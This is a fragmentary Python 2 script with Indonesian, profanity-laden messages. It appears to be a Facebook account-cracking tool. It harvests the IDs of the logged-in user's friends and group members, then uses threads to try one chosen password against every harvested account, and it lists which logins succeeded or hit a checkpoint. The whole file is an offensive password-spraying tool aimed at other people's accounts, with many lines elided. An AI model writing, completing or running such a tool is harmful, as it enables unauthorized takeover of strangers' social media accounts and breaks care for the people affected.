...
try:
  import mechanize
	...
	cetak('!m[!] SepertiNya Module !cmechanize!m belum di install bangsad...\n!h[!] pip2 install mechanize')
	sys.exit()
br = 0
log = 0
id_bteman = []
...
def crack(d):
	while 1:
		s = inputD('[?] Masukin sandi lu bangsad')
		if len(s) < 6:
			cetak('!m[!] Jumlah huruf minimal !k4')
		else:
			break
	return crack0(d,s)
def tampilhasil(akun,sandi,data):
	...
	for i in akun:
		...
		if st == 1:
			...
			salah += 1
	cetak('!h[*] Yang Berhasil Cuman Segini Tod !c%d'%len(berhasil))
	if len(berhasil) != 0:
		for i in berhasil:
			cetak('!h### !p%s !m=> !b[!k%s!b]'%(i,sandi))
	cetak('!k[*] Yah Kena Cekpoint Mungkin Lu Kurang Ganteng Bangsad !c%d'%len(cekpoint))
	if len(cekpoint) != 0:
		for i in cekpoint:
			cetak('!k### !p%s !m=> !b[!k%s!b]'%(i,sandi))
	cetak('!m[*] Gagal    !c'+str(salah))
	i = inputD('[?] Tidak Puas dengan Hasil,Mau coba ngewe lagi (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(data)
	else:
		return menu()
def crack0(data,sandi):
	...
	cetak('!h[*] Bentar admin cape ngecrackingnya tod  !k0!m%',1)
	sys.stdout.flush()
	jml0,jml1 = 0,0
	th = []
	for i in data:
	...
	while 1:
		try:
			for i in th:
				status,id = i.update()
				if status != 0:
					cetak('\r!h[*] Bentar admin cape ngecrackingnya tod  !k%d!m%s!0'%(int(float((float(jml0)/float(jml1))*100)),'%'),1)
					sys.stdout.flush()
					del(th[th.index(i)])
					if status == 4:
						h_error.append(id)
		...
		try:
			...
			keluar()
	cetak('\r!h[*] Bentar admin cape ngecrackingnya tod  !k100!m%      ')
...
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?] Riset Hasil Ngewe ? /lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!h[*] Selamat datang ngentod !k%s'%nama)
...
def idgroup():
	...
	while 1:
		...
		try:
			...
			cetak('!m[!] Cuman Bisa Mengambil Segini Tod !h %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?] Langsung Ngewe Kaga (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def idteman():
	...
	try:
		...
		if len(id_teman) != 0:
			cetak('!m[!] Cuman dapat mengambil segini tod !p%d id'%len(id_bteman))
		else:
			cetak('!m[!] Batal')
			keluar()
	while 1:
		...
		try:
			...
			cetak('\n!m[!] Cuman dapat mengambil segini tod !p%d id'%len(id_bteman))
			break
	simpan()
